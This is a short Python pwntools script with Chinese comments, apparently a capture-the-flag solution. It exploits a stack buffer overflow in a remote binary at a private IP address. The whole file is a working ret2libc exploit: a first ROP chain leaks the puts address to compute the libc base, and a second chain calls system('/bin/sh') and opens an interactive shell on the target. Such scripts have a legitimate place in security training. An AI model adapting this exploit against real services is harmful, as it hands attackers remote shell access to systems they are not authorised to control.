from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11205
p = remote(host, port)

# 加载目标程序的 ELF 和 libc 信息
e = ELF("./pwn.bin")
libc = ELF("./libc.so.6")

# ROP gadgets 和函数地址
pop_rdi = 0x40117E        # pop rdi; ret
puts_got = e.got["puts"]  # puts 的 GOT 地址
puts_plt = e.plt["puts"]  # puts 的 PLT 地址
vuln_addr = e.symbols["vuln"]  # 再次回到漏洞点

# 第一次攻击：泄露 libc 的基地址
payload = cyclic(72)                     # 填充缓冲区
payload += p64(pop_rdi) + p64(puts_got)  # 设置 rdi = puts 的 GOT 地址
payload += p64(puts_plt)                 # 调用 puts，打印 GOT 地址
payload += p64(vuln_addr)                # 跳转回漏洞函数
p.sendlineafter(b'Go Go Go!!!\n', payload)

# 接收泄露的地址并计算 libc 基地址
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  # 提取 puts 地址
libc_base = puts_addr - libc.sym["puts"]                     # 计算 libc 基地址
system_addr = libc_base + libc.sym["system"]                 # 计算 system 地址
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))       # 定位 "/bin/sh" 地址

# 第二次攻击：构造 ROP 链执行 system("/bin/sh")
ret = 0x4011CC  # ret; 用于对齐栈
payload = cyclic(72)                     # 填充缓冲区
payload += p64(ret)                      # 对齐栈（16字节对齐）
payload += p64(pop_rdi) + p64(binsh_addr)  # 设置 rdi = "/bin/sh"
payload += p64(system_addr)              # 调用 system
p.sendline(payload)

# 获取交互式 shell
p.interactive()
